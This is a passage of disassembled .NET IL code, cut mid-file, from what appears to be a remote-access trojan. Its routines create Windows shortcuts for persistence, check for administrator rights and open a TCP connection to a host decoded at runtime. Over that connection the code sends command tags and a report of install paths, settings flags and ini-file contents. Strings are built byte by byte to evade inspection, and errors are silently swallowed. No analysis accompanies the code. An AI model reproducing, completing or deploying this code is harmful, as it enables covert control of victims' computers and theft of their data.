      IL_006f:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0074:  stloc.2
      IL_0075:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_007a:  leave.s    IL_007c

    }  // end handler
    IL_007c:  ldc.i4.1
    IL_007d:  brtrue.s   IL_0004

    IL_007f:  ret
  } // end of method Evering::Pu

  .method public static object  M(string File,
                                  string ShortcutFolder,
                                  string Name,
                                  string WorkDirectory) cil managed
  {
    // Code size       227 (0xe3)
    .maxstack  9
    .locals init (object V_0,
             object V_1,
             object V_2,
             object[] V_3)
    IL_0000:  ldstr      "WScript.Shell"
    IL_0005:  ldstr      ""
    IL_000a:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::CreateObject(string,
                                                                                                       string)
    IL_000f:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
    IL_0014:  stloc.2
    IL_0015:  ldloc.2
    IL_0016:  ldnull
    IL_0017:  ldstr      "CreateShortcut"
    IL_001c:  ldc.i4.1
    IL_001d:  newarr     [mscorlib]System.Object
    IL_0022:  stloc.3
    IL_0023:  ldloc.3
    IL_0024:  ldc.i4.0
    IL_0025:  ldarg.1
    IL_0026:  ldstr      "\\"
    IL_002b:  ldarg.2
    IL_002c:  ldstr      ".lnk"
    IL_0031:  call       string [mscorlib]System.String::Concat(string,
                                                                string,
                                                                string,
                                                                string)
    IL_0036:  stelem.ref
    IL_0037:  ldloc.3
    IL_0038:  ldnull
    IL_0039:  ldnull
    IL_003a:  ldnull
    IL_003b:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateGet(object,
                                                                                                                      class [mscorlib]System.Type,
                                                                                                                      string,
                                                                                                                      object[],
                                                                                                                      string[],
                                                                                                                      class [mscorlib]System.Type[],
                                                                                                                      bool[])
    IL_0040:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
    IL_0045:  stloc.1
    IL_0046:  ldloc.1
    IL_0047:  ldnull
    IL_0048:  ldstr      "TargetPath"
    IL_004d:  ldc.i4.1
    IL_004e:  newarr     [mscorlib]System.Object
    IL_0053:  stloc.3
    IL_0054:  ldloc.3
    IL_0055:  ldc.i4.0
    IL_0056:  ldarg.0
    IL_0057:  stelem.ref
    IL_0058:  ldloc.3
    IL_0059:  ldnull
    IL_005a:  ldnull
    IL_005b:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateSet(object,
                                                                                                                    class [mscorlib]System.Type,
                                                                                                                    string,
                                                                                                                    object[],
                                                                                                                    string[],
                                                                                                                    class [mscorlib]System.Type[])
    IL_0060:  ldloc.1
    IL_0061:  ldnull
    IL_0062:  ldstr      "WindowStyle"
    IL_0067:  ldc.i4.1
    IL_0068:  newarr     [mscorlib]System.Object
    IL_006d:  stloc.3
    IL_006e:  ldloc.3
    IL_006f:  ldc.i4.0
    IL_0070:  ldc.i4.1
    IL_0071:  box        [mscorlib]System.Int32
    IL_0076:  stelem.ref
    IL_0077:  ldloc.3
    IL_0078:  ldnull
    IL_0079:  ldnull
    IL_007a:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateSet(object,
                                                                                                                    class [mscorlib]System.Type,
                                                                                                                    string,
                                                                                                                    object[],
                                                                                                                    string[],
                                                                                                                    class [mscorlib]System.Type[])
    IL_007f:  ldloc.1
    IL_0080:  ldnull
    IL_0081:  ldstr      "IconLocation"
    IL_0086:  ldc.i4.1
    IL_0087:  newarr     [mscorlib]System.Object
    IL_008c:  stloc.3
    IL_008d:  ldloc.3
    IL_008e:  ldc.i4.0
    IL_008f:  ldarg.0
    IL_0090:  ldstr      ",0"
    IL_0095:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_009a:  stelem.ref
    IL_009b:  ldloc.3
    IL_009c:  ldnull
    IL_009d:  ldnull
    IL_009e:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateSet(object,
                                                                                                                    class [mscorlib]System.Type,
                                                                                                                    string,
                                                                                                                    object[],
                                                                                                                    string[],
                                                                                                                    class [mscorlib]System.Type[])
    IL_00a3:  ldloc.1
    IL_00a4:  ldnull
    IL_00a5:  ldstr      "WorkingDirectory"
    IL_00aa:  ldc.i4.1
    IL_00ab:  newarr     [mscorlib]System.Object
    IL_00b0:  stloc.3
    IL_00b1:  ldloc.3
    IL_00b2:  ldc.i4.0
    IL_00b3:  ldstr      ""
    IL_00b8:  stelem.ref
    IL_00b9:  ldloc.3
    IL_00ba:  ldnull
    IL_00bb:  ldnull
    IL_00bc:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateSet(object,
                                                                                                                    class [mscorlib]System.Type,
                                                                                                                    string,
                                                                                                                    object[],
                                                                                                                    string[],
                                                                                                                    class [mscorlib]System.Type[])
    IL_00c1:  ldloc.1
    IL_00c2:  ldnull
    IL_00c3:  ldstr      "Save"
    IL_00c8:  ldc.i4.0
    IL_00c9:  newarr     [mscorlib]System.Object
    IL_00ce:  ldnull
    IL_00cf:  ldnull
    IL_00d0:  ldnull
    IL_00d1:  ldc.i4.1
    IL_00d2:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateCall(object,
                                                                                                                       class [mscorlib]System.Type,
                                                                                                                       string,
                                                                                                                       object[],
                                                                                                                       string[],
                                                                                                                       class [mscorlib]System.Type[],
                                                                                                                       bool[],
                                                                                                                       bool)
    IL_00d7:  pop
    IL_00d8:  ldc.i4.1
    IL_00d9:  box        [mscorlib]System.Boolean
    IL_00de:  stloc.0
    IL_00df:  br.s       IL_00e1

    IL_00e1:  ldloc.0
    IL_00e2:  ret
  } // end of method Evering::M

  .method public static void  I() cil managed
  {
    // Code size       26 (0x1a)
    .maxstack  2
    .locals init (class [mscorlib]System.Threading.Thread V_0)
    IL_0000:  ldnull
    IL_0001:  ldftn      void Q.Evering::S()
    IL_0007:  newobj     instance void [mscorlib]System.Threading.ThreadStart::.ctor(object,
                                                                                     native int)
    IL_000c:  ldc.i4.1
    IL_000d:  newobj     instance void [mscorlib]System.Threading.Thread::.ctor(class [mscorlib]System.Threading.ThreadStart,
                                                                                int32)
    IL_0012:  stloc.0
    IL_0013:  ldloc.0
    IL_0014:  callvirt   instance void [mscorlib]System.Threading.Thread::Start()
    IL_0019:  ret
  } // end of method Evering::I

  .method public static void  U() cil managed
  {
    // Code size       26 (0x1a)
    .maxstack  2
    .locals init (class [mscorlib]System.Threading.Thread V_0)
    IL_0000:  ldnull
    IL_0001:  ldftn      void Q.Evering::F()
    IL_0007:  newobj     instance void [mscorlib]System.Threading.ThreadStart::.ctor(object,
                                                                                     native int)
    IL_000c:  ldc.i4.1
    IL_000d:  newobj     instance void [mscorlib]System.Threading.Thread::.ctor(class [mscorlib]System.Threading.ThreadStart,
                                                                                int32)
    IL_0012:  stloc.0
    IL_0013:  ldloc.0
    IL_0014:  callvirt   instance void [mscorlib]System.Threading.Thread::Start()
    IL_0019:  ret
  } // end of method Evering::U

  .method public static void  C() cil managed
  {
    // Code size       26 (0x1a)
    .maxstack  2
    .locals init (class [mscorlib]System.Threading.Thread V_0)
    IL_0000:  ldnull
    IL_0001:  ldftn      void Q.Evering::Pu()
    IL_0007:  newobj     instance void [mscorlib]System.Threading.ThreadStart::.ctor(object,
                                                                                     native int)
    IL_000c:  ldc.i4.1
    IL_000d:  newobj     instance void [mscorlib]System.Threading.Thread::.ctor(class [mscorlib]System.Threading.ThreadStart,
                                                                                int32)
    IL_0012:  stloc.0
    IL_0013:  ldloc.0
    IL_0014:  callvirt   instance void [mscorlib]System.Threading.Thread::Start()
    IL_0019:  ret
  } // end of method Evering::C

  .method public static bool  Ia() cil managed
  {
    // Code size       29 (0x1d)
    .maxstack  2
    .locals init (bool V_0,
             class [mscorlib]System.Security.Principal.WindowsIdentity V_1,
             class [mscorlib]System.Security.Principal.WindowsPrincipal V_2)
    IL_0000:  call       class [mscorlib]System.Security.Principal.WindowsIdentity [mscorlib]System.Security.Principal.WindowsIdentity::GetCurrent()
    IL_0005:  stloc.1
    IL_0006:  ldloc.1
    IL_0007:  newobj     instance void [mscorlib]System.Security.Principal.WindowsPrincipal::.ctor(class [mscorlib]System.Security.Principal.WindowsIdentity)
    IL_000c:  stloc.2
    IL_000d:  ldloc.2
    IL_000e:  ldc.i4     0x220
    IL_0013:  callvirt   instance bool [mscorlib]System.Security.Principal.WindowsPrincipal::IsInRole(valuetype [mscorlib]System.Security.Principal.WindowsBuiltInRole)
    IL_0018:  stloc.0
    IL_0019:  br.s       IL_001b

    IL_001b:  ldloc.0
    IL_001c:  ret
  } // end of method Evering::Ia

} // end of class Q.Evering

.class public auto ansi beforefieldinit Q.Loader
       extends [mscorlib]System.Object
{
  .field public static string Stu
  .method private specialname rtspecialname static 
          void  .cctor() cil managed
  {
    // Code size       59 (0x3b)
    .maxstack  6
    .locals init (uint8[] V_0)
    IL_0000:  ldsfld     string Q.SettingPad::Sti
    IL_0005:  ldstr      "\\"
    IL_000a:  ldsfld     string Q.SettingPad::RG
    IL_000f:  ldc.i4.4
    IL_0010:  newarr     [mscorlib]System.Byte
    IL_0015:  stloc.0
    IL_0016:  ldloc.0
    IL_0017:  ldc.i4.0
    IL_0018:  ldc.i4.s   46
    IL_001a:  stelem.i1
    IL_001b:  ldloc.0
    IL_001c:  ldc.i4.1
    IL_001d:  ldc.i4.s   114
    IL_001f:  stelem.i1
    IL_0020:  ldloc.0
    IL_0021:  ldc.i4.2
    IL_0022:  ldc.i4.s   116
    IL_0024:  stelem.i1
    IL_0025:  ldloc.0
    IL_0026:  ldc.i4.3
    IL_0027:  ldc.i4.s   102
    IL_0029:  stelem.i1
    IL_002a:  ldloc.0
    IL_002b:  call       string Q.BasicFunctions::StrToBi(uint8[])
    IL_0030:  call       string [mscorlib]System.String::Concat(string,
                                                                string,
                                                                string,
                                                                string)
    IL_0035:  stsfld     string Q.Loader::Stu
    IL_003a:  ret
  } // end of method Loader::.cctor

  .method public specialname rtspecialname 
          instance void  .ctor() cil managed
  {
    // Code size       7 (0x7)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  call       instance void [mscorlib]System.Object::.ctor()
    IL_0006:  ret
  } // end of method Loader::.ctor

  .method private static void  S(object A) cil managed
  {
    // Code size       12 (0xc)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  castclass  uint8[]
    IL_0006:  call       void Q.DataRequist::ProcessingData(uint8[])
    IL_000b:  ret
  } // end of method Loader::S

  .method public static bool  Connection() cil managed
  {
    // Code size       914 (0x392)
    .maxstack  5
    .locals init (bool V_0,
             class [mscorlib]System.IO.FileInfo V_1,
             class [mscorlib]System.Exception V_2,
             class [mscorlib]System.Exception V_3,
             class [mscorlib]System.Exception V_4,
             class [mscorlib]System.Threading.Thread V_5,
             string V_6,
             string V_7,
             string V_8,
             class [mscorlib]System.Exception V_9,
             class [mscorlib]System.Exception V_10,
             class [mscorlib]System.Threading.Thread V_11,
             class [mscorlib]System.IO.FileInfo V_12,
             string V_13,
             string V_14,
             uint8[] V_15,
             string[] V_16,
             string[] V_17)
    IL_0000:  ldc.i4.0
    IL_0001:  stsfld     bool Q.SettingPad::Cn
    IL_0006:  ldc.i4.s   10
    IL_0008:  call       object Q.BasicFunctions::Thr(int32)
    IL_000d:  pop
    IL_000e:  ldsfld     class [mscorlib]System.IO.FileInfo Q.SettingPad::LO
    IL_0013:  stloc.1
    IL_0014:  ldloc.1
    IL_0015:  stloc.s    V_12
    IL_0017:  ldloc.s    V_12
    IL_0019:  call       void [mscorlib]System.Threading.Monitor::Enter(object)
    .try
    {
      .try
      {
        IL_001e:  ldsfld     class [System]System.Net.Sockets.TcpClient Q.SettingPad::C
        IL_0023:  brfalse.s  IL_0045

        .try
        {
          IL_0025:  ldsfld     class [System]System.Net.Sockets.TcpClient Q.SettingPad::C
          IL_002a:  callvirt   instance void [System]System.Net.Sockets.TcpClient::Close()
          IL_002f:  ldnull
          IL_0030:  stsfld     class [System]System.Net.Sockets.TcpClient Q.SettingPad::C
          IL_0035:  leave.s    IL_0045

        }  // end .try
        catch [mscorlib]System.Exception 
        {
          IL_0037:  dup
          IL_0038:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
          IL_003d:  stloc.2
          IL_003e:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
          IL_0043:  leave.s    IL_0045

        }  // end handler
        .try
        {
          IL_0045:  ldsfld     class [mscorlib]System.IO.MemoryStream Q.SettingPad::MeM
          IL_004a:  callvirt   instance void [mscorlib]System.IO.Stream::Dispose()
          IL_004f:  leave.s    IL_005f

        }  // end .try
        catch [mscorlib]System.Exception 
        {
          IL_0051:  dup
          IL_0052:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
          IL_0057:  stloc.3
          IL_0058:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
          IL_005d:  leave.s    IL_005f

        }  // end handler
        IL_005f:  leave.s    IL_0070

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_0061:  dup
        IL_0062:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_0067:  stloc.s    V_4
        IL_0069:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_006e:  leave.s    IL_0070

      }  // end handler
      .try
      {
        IL_0070:  newobj     instance void [mscorlib]System.IO.MemoryStream::.ctor()
        IL_0075:  stsfld     class [mscorlib]System.IO.MemoryStream Q.SettingPad::MeM
        IL_007a:  newobj     instance void [System]System.Net.Sockets.TcpClient::.ctor()
        IL_007f:  stsfld     class [System]System.Net.Sockets.TcpClient Q.SettingPad::C
        IL_0084:  ldsfld     class [System]System.Net.Sockets.TcpClient Q.SettingPad::C
        IL_0089:  callvirt   instance class [System]System.Net.Sockets.Socket [System]System.Net.Sockets.TcpClient::get_Client()
        IL_008e:  ldc.i4     0xffff
        IL_0093:  ldc.i4.8
        IL_0094:  ldc.i4.1
        IL_0095:  callvirt   instance void [System]System.Net.Sockets.Socket::SetSocketOption(valuetype [System]System.Net.Sockets.SocketOptionLevel,
                                                                                              valuetype [System]System.Net.Sockets.SocketOptionName,
                                                                                              bool)
        IL_009a:  ldsfld     class [System]System.Net.Sockets.TcpClient Q.SettingPad::C
        IL_009f:  ldc.i4.m1
        IL_00a0:  callvirt   instance void [System]System.Net.Sockets.TcpClient::set_ReceiveTimeout(int32)
        IL_00a5:  ldsfld     class [System]System.Net.Sockets.TcpClient Q.SettingPad::C
        IL_00aa:  ldc.i4.m1
        IL_00ab:  callvirt   instance void [System]System.Net.Sockets.TcpClient::set_SendTimeout(int32)
        IL_00b0:  ldsfld     class [System]System.Net.Sockets.TcpClient Q.SettingPad::C
        IL_00b5:  ldc.i4     0xc800
        IL_00ba:  callvirt   instance void [System]System.Net.Sockets.TcpClient::set_SendBufferSize(int32)
        IL_00bf:  ldsfld     class [System]System.Net.Sockets.TcpClient Q.SettingPad::C
        IL_00c4:  ldc.i4     0xc800
        IL_00c9:  callvirt   instance void [System]System.Net.Sockets.TcpClient::set_ReceiveBufferSize(int32)
        IL_00ce:  ldsfld     class [System]System.Net.Sockets.TcpClient Q.SettingPad::C
        IL_00d3:  call       object Q.Network::MH()
        IL_00d8:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(object)
        IL_00dd:  stloc.s    V_13
        IL_00df:  ldloca.s   V_13
        IL_00e1:  call       string Q.BasicFunctions::DEB(string&)
        IL_00e6:  call       string Q.Network::NPn()
        IL_00eb:  stloc.s    V_14
        IL_00ed:  ldloca.s   V_14
        IL_00ef:  call       string Q.BasicFunctions::DEB(string&)
        IL_00f4:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToInteger(string)
        IL_00f9:  callvirt   instance void [System]System.Net.Sockets.TcpClient::Connect(string,
                                                                                         int32)
        IL_00fe:  ldnull
        IL_00ff:  ldftn      void Q.Loader::_Lambda$__1()
        IL_0105:  newobj     instance void [mscorlib]System.Threading.ThreadStart::.ctor(object,
                                                                                         native int)
        IL_010a:  newobj     instance void [mscorlib]System.Threading.Thread::.ctor(class [mscorlib]System.Threading.ThreadStart)
        IL_010f:  stloc.s    V_5
        IL_0111:  ldloc.s    V_5
        IL_0113:  callvirt   instance void [mscorlib]System.Threading.Thread::Start()
        IL_0118:  ldc.i4.1
        IL_0119:  stsfld     bool Q.SettingPad::Cn
        IL_011e:  ldc.i4.3
        IL_011f:  newarr     [mscorlib]System.Byte
        IL_0124:  stloc.s    V_15
        IL_0126:  ldloc.s    V_15
        IL_0128:  ldc.i4.0
        IL_0129:  ldc.i4.s   108
        IL_012b:  stelem.i1
        IL_012c:  ldloc.s    V_15
        IL_012e:  ldc.i4.1
        IL_012f:  ldc.i4.s   50
        IL_0131:  stelem.i1
        IL_0132:  ldloc.s    V_15
        IL_0134:  ldc.i4.2
        IL_0135:  ldc.i4.s   108
        IL_0137:  stelem.i1
        IL_0138:  ldloc.s    V_15
        IL_013a:  call       string Q.BasicFunctions::StrToBi(uint8[])
        IL_013f:  call       bool Q.BasicFunctions::SendIt(string)
        IL_0144:  pop
        IL_0145:  ldc.i4.3
        IL_0146:  newarr     [mscorlib]System.Byte
        IL_014b:  stloc.s    V_15
        IL_014d:  ldloc.s    V_15
        IL_014f:  ldc.i4.0
        IL_0150:  ldc.i4.s   97
        IL_0152:  stelem.i1
        IL_0153:  ldloc.s    V_15
        IL_0155:  ldc.i4.1
        IL_0156:  ldc.i4.s   110
        IL_0158:  stelem.i1
        IL_0159:  ldloc.s    V_15
        IL_015b:  ldc.i4.2
        IL_015c:  ldc.i4.s   118
        IL_015e:  stelem.i1
        IL_015f:  ldloc.s    V_15
        IL_0161:  call       string Q.BasicFunctions::StrToBi(uint8[])
        IL_0166:  call       bool Q.BasicFunctions::SendIt(string)
        IL_016b:  pop
        .try
        {
          IL_016c:  ldsfld     string Q.Loader::Stu
          IL_0171:  ldc.i4.4
          IL_0172:  newarr     [mscorlib]System.Byte
          IL_0177:  stloc.s    V_15
          IL_0179:  ldloc.s    V_15
          IL_017b:  ldc.i4.0
          IL_017c:  ldc.i4.s   46
          IL_017e:  stelem.i1
          IL_017f:  ldloc.s    V_15
          IL_0181:  ldc.i4.1
          IL_0182:  ldc.i4.s   105
          IL_0184:  stelem.i1
          IL_0185:  ldloc.s    V_15
          IL_0187:  ldc.i4.2
          IL_0188:  ldc.i4.s   110
          IL_018a:  stelem.i1
          IL_018b:  ldloc.s    V_15
          IL_018d:  ldc.i4.3
          IL_018e:  ldc.i4.s   105
          IL_0190:  stelem.i1
          IL_0191:  ldloc.s    V_15
          IL_0193:  call       string Q.BasicFunctions::StrToBi(uint8[])
          IL_0198:  call       string [mscorlib]System.String::Concat(string,
                                                                      string)
          IL_019d:  stloc.s    V_6
          IL_019f:  ldloc.s    V_6
          IL_01a1:  call       bool [mscorlib]System.IO.File::Exists(string)
          IL_01a6:  brtrue.s   IL_01c2

          IL_01a8:  ldloc.s    V_7
          IL_01aa:  ldsflda    string Q.SettingPad::VN
          IL_01af:  call       string Q.BasicFunctions::DEB(string&)
          IL_01b4:  ldstr      "\r\n"
          IL_01b9:  call       string [mscorlib]System.String::Concat(string,
                                                                      string,
                                                                      string)
          IL_01be:  stloc.s    V_7
          IL_01c0:  br.s       IL_01e4

          IL_01c2:  ldloc.s    V_6
          IL_01c4:  call       string [mscorlib]System.IO.File::ReadAllText(string)
          IL_01c9:  stloc.s    V_8
          IL_01cb:  ldloc.s    V_7
          IL_01cd:  ldloc.s    V_8
          IL_01cf:  stloc.s    V_14
          IL_01d1:  ldloca.s   V_14
          IL_01d3:  call       string Q.BasicFunctions::DEB(string&)
          IL_01d8:  ldstr      "\r\n"
          IL_01dd:  call       string [mscorlib]System.String::Concat(string,
                                                                      string,
                                                                      string)
          IL_01e2:  stloc.s    V_7
          IL_01e4:  ldc.i4.s   16
          IL_01e6:  newarr     [mscorlib]System.String
          IL_01eb:  stloc.s    V_17
          IL_01ed:  ldloc.s    V_17
          IL_01ef:  ldc.i4.0
          IL_01f0:  ldc.i4.5
          IL_01f1:  newarr     [mscorlib]System.String
          IL_01f6:  stloc.s    V_16
          IL_01f8:  ldloc.s    V_16
          IL_01fa:  ldc.i4.0
          IL_01fb:  ldloc.s    V_7
          IL_01fd:  stelem.ref
          IL_01fe:  ldloc.s    V_16
          IL_0200:  ldc.i4.1
          IL_0201:  call       object Q.Network::MH()
          IL_0206:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(object)
          IL_020b:  stloc.s    V_14
          IL_020d:  ldloca.s   V_14
          IL_020f:  call       string Q.BasicFunctions::DEB(string&)
          IL_0214:  stelem.ref
          IL_0215:  ldloc.s    V_16
          IL_0217:  ldc.i4.2
          IL_0218:  ldstr      "\r\n"
          IL_021d:  stelem.ref
          IL_021e:  ldloc.s    V_16
          IL_0220:  ldc.i4.3
          IL_0221:  call       string Q.Network::NPn()
          IL_0226:  stloc.s    V_13
          IL_0228:  ldloca.s   V_13
          IL_022a:  call       string Q.BasicFunctions::DEB(string&)
          IL_022f:  stelem.ref
          IL_0230:  ldloc.s    V_16
          IL_0232:  ldc.i4.4
          IL_0233:  ldstr      "\r\n"
          IL_0238:  stelem.ref
          IL_0239:  ldloc.s    V_16
          IL_023b:  call       string [mscorlib]System.String::Concat(string[])
          IL_0240:  stelem.ref
          IL_0241:  ldloc.s    V_17
          IL_0243:  ldc.i4.1
          IL_0244:  ldsfld     string Q.SettingPad::DR
          IL_0249:  stelem.ref
          IL_024a:  ldloc.s    V_17
          IL_024c:  ldc.i4.2
          IL_024d:  ldstr      "\\"
          IL_0252:  stelem.ref
          IL_0253:  ldloc.s    V_17
          IL_0255:  ldc.i4.3
          IL_0256:  ldsfld     string Q.SettingPad::Fol
          IL_025b:  stelem.ref
          IL_025c:  ldloc.s    V_17
          IL_025e:  ldc.i4.4
          IL_025f:  ldstr      "\\"
          IL_0264:  stelem.ref
          IL_0265:  ldloc.s    V_17
          IL_0267:  ldc.i4.5
          IL_0268:  ldsfld     string Q.SettingPad::RG
          IL_026d:  stelem.ref
          IL_026e:  ldloc.s    V_17
          IL_0270:  ldc.i4.6
          IL_0271:  ldstr      "\r\n"
          IL_0276:  stelem.ref
          IL_0277:  ldloc.s    V_17
          IL_0279:  ldc.i4.7
          IL_027a:  ldsfld     string Q.SettingPad::Ex
          IL_027f:  stelem.ref
          IL_0280:  ldloc.s    V_17
          IL_0282:  ldc.i4.8
          IL_0283:  ldstr      "\r\n"
          IL_0288:  stelem.ref
          IL_0289:  ldloc.s    V_17
          IL_028b:  ldc.i4.s   9
          IL_028d:  ldsfld     bool Q.SettingPad::Se
          IL_0292:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(bool)
          IL_0297:  stelem.ref
          IL_0298:  ldloc.s    V_17
          IL_029a:  ldc.i4.s   10
          IL_029c:  ldstr      "\r\n"
          IL_02a1:  stelem.ref
          IL_02a2:  ldloc.s    V_17
          IL_02a4:  ldc.i4.s   11
          IL_02a6:  ldsfld     bool Q.SettingPad::Sh
          IL_02ab:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(bool)
          IL_02b0:  stelem.ref
          IL_02b1:  ldloc.s    V_17
          IL_02b3:  ldc.i4.s   12
          IL_02b5:  ldstr      "\r\n"
          IL_02ba:  stelem.ref
          IL_02bb:  ldloc.s    V_17
          IL_02bd:  ldc.i4.s   13
          IL_02bf:  ldsfld     bool Q.SettingPad::Bt
          IL_02c4:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(bool)
          IL_02c9:  stelem.ref
          IL_02ca:  ldloc.s    V_17
          IL_02cc:  ldc.i4.s   14
          IL_02ce:  ldstr      "\r\n\r\n"
          IL_02d3:  stelem.ref
          IL_02d4:  ldloc.s    V_17
          IL_02d6:  ldc.i4.s   15
          IL_02d8:  ldsfld     bool Q.SettingPad::Isu
          IL_02dd:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(bool)
          IL_02e2:  stelem.ref
          IL_02e3:  ldloc.s    V_17
          IL_02e5:  call       string [mscorlib]System.String::Concat(string[])
          IL_02ea:  stloc.s    V_7
          IL_02ec:  ldc.i4.4
          IL_02ed:  newarr     [mscorlib]System.Byte
          IL_02f2:  stloc.s    V_15
          IL_02f4:  ldloc.s    V_15
          IL_02f6:  ldc.i4.0
          IL_02f7:  ldc.i4.s   77
          IL_02f9:  stelem.i1
          IL_02fa:  ldloc.s    V_15
          IL_02fc:  ldc.i4.1
          IL_02fd:  ldc.i4.s   105
          IL_02ff:  stelem.i1
          IL_0300:  ldloc.s    V_15
          IL_0302:  ldc.i4.2
          IL_0303:  ldc.i4.s   99
          IL_0305:  stelem.i1
          IL_0306:  ldloc.s    V_15
          IL_0308:  ldc.i4.3
          IL_0309:  ldc.i4.s   114
          IL_030b:  stelem.i1
          IL_030c:  ldloc.s    V_15
          IL_030e:  call       string Q.BasicFunctions::StrToBi(uint8[])
          IL_0313:  ldsfld     string Q.SettingPad::Y
          IL_0318:  ldloca.s   V_7
          IL_031a:  call       string Q.BasicFunctions::ENB(string&)
          IL_031f:  call       string [mscorlib]System.String::Concat(string,
                                                                      string,
                                                                      string)
          IL_0324:  call       bool Q.BasicFunctions::SendIt(string)
          IL_0329:  pop
          IL_032a:  leave.s    IL_033b

        }  // end .try
        catch [mscorlib]System.Exception 
        {
          IL_032c:  dup
          IL_032d:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
          IL_0332:  stloc.s    V_9
          IL_0334:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
          IL_0339:  leave.s    IL_033b

        }  // end handler
        IL_033b:  leave.s    IL_037e

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_033d:  dup
        IL_033e:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_0343:  stloc.s    V_10
        IL_0345:  ldnull
        IL_0346:  ldftn      void Q.Loader::_Lambda$__2()
        IL_034c:  newobj     instance void [mscorlib]System.Threading.ThreadStart::.ctor(object,
                                                                                         native int)
        IL_0351:  newobj     instance void [mscorlib]System.Threading.Thread::.ctor(class [mscorlib]System.Threading.ThreadStart)
        IL_0356:  stloc.s    V_11
        IL_0358:  ldloc.s    V_11
        IL_035a:  callvirt   instance void [mscorlib]System.Threading.Thread::Start()
        IL_035f:  ldsfld     int32 Q.SettingPad::NH
        IL_0364:  ldc.i4.1
        IL_0365:  add.ovf
        IL_0366:  stsfld     int32 Q.SettingPad::NH
        IL_036b:  ldsfld     int32 Q.SettingPad::NP
        IL_0370:  ldc.i4.1
        IL_0371:  add.ovf
        IL_0372:  stsfld     int32 Q.SettingPad::NP
        IL_0377:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_037c:  leave.s    IL_037e

      }  // end handler
      IL_037e:  leave.s    IL_0388

    }  // end .try
    finally
    {
      IL_0380:  ldloc.s    V_12
      IL_0382:  call       void [mscorlib]System.Threading.Monitor::Exit(object)
      IL_0387:  endfinally
    }  // end handler
    IL_0388:  ldsfld     bool Q.SettingPad::Cn
    IL_038d:  stloc.0
    IL_038e:  br.s       IL_0390

    IL_0390:  ldloc.0
    IL_0391:  ret
  } // end of method Loader::Connection

  .method public static void  Active() cil managed
  {
    // Code size       45 (0x2d)
    .maxstack  8
    IL_0000:  ldsfld     string Q.SettingPad::HH2
    IL_0005:  ldstr      ","
    IL_000a:  ldc.i4.m1
    IL_000b:  ldc.i4.0
    IL_000c:  call       string[] [Microsoft.VisualBasic]Microsoft.VisualBasic.Strings::Split(string,
                                                                                              string,
                                                                                              int32,
                                                                                              valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.CompareMethod)
    IL_0011:  stsfld     string[] Q.SettingPad::HH
    IL_0016:  ldsfld     string Q.SettingPad::PN2
    IL_001b:  ldstr      ","
    IL_0020:  ldc.i4.m1
    IL_0021:  ldc.i4.0
    IL_0022:  call       string[] [Microsoft.VisualBasic]Microsoft.VisualBasic.Strings::Split(string,
                                                                                              string,
                                                                                              int32,
                                                                                              valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.CompareMethod)
    IL_0027:  stsfld     string[] Q.SettingPad::PN
    IL_002c:  ret
  } // end of method Loader::Active

  .method public static void  K() cil managed noinlining nooptimization
  {
    // Code size       279 (0x117)
    .maxstack  3
    .locals init (int32 V_0,
             class [mscorlib]System.Threading.Thread V_1,
             string V_2,
             class [mscorlib]System.Exception V_3,
             class [mscorlib]System.Exception V_4,
             string V_5,
             class [mscorlib]System.Exception V_6,
             native int V_7,
             uint8[] V_8)
    .try
    {
      IL_0000:  ldsfld     string Q.SettingPad::RG
